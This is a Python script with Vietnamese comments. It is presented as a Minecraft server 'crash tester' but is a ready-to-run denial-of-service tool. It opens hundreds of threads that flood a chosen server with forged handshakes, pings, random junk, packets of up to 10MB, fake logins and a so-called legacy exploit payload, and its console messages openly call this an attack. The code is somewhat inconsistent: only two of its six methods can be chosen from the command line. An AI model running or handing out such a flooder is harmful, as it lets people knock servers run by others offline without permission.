import socket
import threading
import random
import time
import struct
from argparse import ArgumentParser

class MinecraftCrashTester:
    METHODS = {
        'handshake_flood': "Gửi hàng loạt gói tin handshake không hợp lệ",
        'legacy_exploit': "Khai thác lỗ hổng phiên bản cũ (1.7-1.12)"
    }
    
    def __init__(self, host, port=25565, threads=500, timeout=3, method='all'):
        self.host = host
        self.port = port
        self.threads = threads
        self.timeout = timeout
        self.method = method
        self.counter = 0
        self.running = False
        self.attack_methods = {
            'handshake_flood': self.handshake_flood,
            'ping_flood': self.ping_flood,
            'invalid_data': self.invalid_data,
            'oversized_packet': self.oversized_packet,
            'login_flood': self.login_flood,
            'legacy_exploit': self.legacy_exploit
        }

    def get_random_bytes(self, size):
        return bytes([random.randint(0, 255) for _ in range(size)])

    def create_socket(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(self.timeout)
            s.connect((self.host, self.port))
            return s
        except:
            return None

    def handshake_flood(self):
        while self.running:
            try:
                s = self.create_socket()
                if s:
                    # Handshake giả mạo với protocol version ngẫu nhiên
                    version = random.randint(0, 999)
                    host_len = len(self.host)
                    port = struct.pack('>H', self.port)
                    data = b'\x00'  # Packet ID cho Handshake
                    data += struct.pack('>B', version)  # Protocol version
                    data += struct.pack('>B', host_len) + self.host.encode()
                    data += port
                    data += b'\x01'  # Next state (1 cho status)
                    
                    s.send(data)
                    time.sleep(0.1)
                    s.close()
                    self.counter += 1
            except:
                pass

    def ping_flood(self):
        while self.running:
            try:
                s = self.create_socket()
                if s:
                    # Gửi gói tin ping request
                    s.send(b'\x01\x00')
                    time.sleep(0.05)
                    s.close()
                    self.counter += 1
            except:
                pass

    def invalid_data(self):
        while self.running:
            try:
                s = self.create_socket()
                if s:
                    # Gửi dữ liệu ngẫu nhiên
                    s.send(self.get_random_bytes(random.randint(10, 1000)))
                    time.sleep(0.1)
                    s.close()
                    self.counter += 1
            except:
                pass

    def oversized_packet(self):
        while self.running:
            try:
                s = self.create_socket()
                if s:
                    # Gửi gói tin cực lớn (lên tới 10MB)
                    size = random.randint(1000000, 10000000)
                    s.send(struct.pack('>I', size) + self.get_random_bytes(size))
                    time.sleep(0.5)
                    s.close()
                    self.counter += 1
            except:
                pass

    def login_flood(self):
        while self.running:
            try:
                s = self.create_socket()
                if s:
                    # Handshake
                    host_len = len(self.host)
                    data = b'\x00'  # Packet ID
                    data += struct.pack('>B', 47)  # Protocol version 1.8
                    data += struct.pack('>B', host_len) + self.host.encode()
                    data += struct.pack('>H', self.port)
                    data += b'\x02'  # Next state (2 cho login)
                    s.send(data)
                    
                    # Login start với tên ngẫu nhiên
                    username = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8))
                    login_data = b'\x00' + struct.pack('>B', len(username)) + username.encode()
                    s.send(login_data)
                    
                    time.sleep(0.2)
                    s.close()
                    self.counter += 1
            except:
                pass

    def legacy_exploit(self):
        while self.running:
            try:
                s = self.create_socket()
                if s:
                    # Khai thác lỗ hổng phiên bản cũ
                    payload = b'\x0F\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                    payload += b'\xFF' * 1000  # Dữ liệu độc hại
                    s.send(payload)
                    time.sleep(0.1)
                    s.close()
                    self.counter += 1
            except:
                pass

    def start(self):
        self.running = True
        threads = []
        
        print(f"[+] Bắt đầu tấn công {self.host}:{self.port}")
        print(f"[+] Phương pháp: {self.method}")
        print(f"[+] Số luồng: {self.threads}")
        
        # Chọn phương pháp tấn công
        if self.method == 'all':
            methods = list(self.attack_methods.values())
        else:
            methods = [self.attack_methods[self.method]]
        
        # Tạo các luồng tấn công
        for _ in range(self.threads):
            for method in methods:
                t = threading.Thread(target=method)
                t.daemon = True
                threads.append(t)
                t.start()
        
        # Hiển thị tiến trình
        try:
            while self.running:
                print(f"\r[+] Gói tin đã gửi: {self.counter}", end='')
                time.sleep(0.5)
        except KeyboardInterrupt:
            self.stop()
        
    def stop(self):
        self.running = False
        print("\n[+] Dừng tấn công")

if __name__ == '__main__':
    parser = ArgumentParser(description='Công cụ thử nghiệm crash server Minecraft')
    parser.add_argument('host', help='Địa chỉ IP server Minecraft')
    parser.add_argument('-p', '--port', type=int, default=25565, help='Cổng server (mặc định: 25565)')
    parser.add_argument('-t', '--threads', type=int, default=500, help='Số luồng tấn công (mặc định: 500)')
    parser.add_argument('-m', '--method', default='all',
                        choices=['all'] + list(MinecraftCrashTester.METHODS.keys()),
                        help='Phương pháp tấn công')
    
    args = parser.parse_args()
    
    print("\nMinecraft Server Crash Tester - Phiên bản nâng cao")
    print("=============================================")
    print("Các phương pháp tấn công có sẵn:")
    for k, v in MinecraftCrashTester.METHODS.items():
        print(f"  {k}: {v}")
    print("=============================================")
    
    tester = MinecraftCrashTester(
        args.host,
        port=args.port,
        threads=args.threads,
        method=args.method
    )
    
    try:
        tester.start()
    except Exception as e:
        print(f"Lỗi: {e}")
        tester.stop()
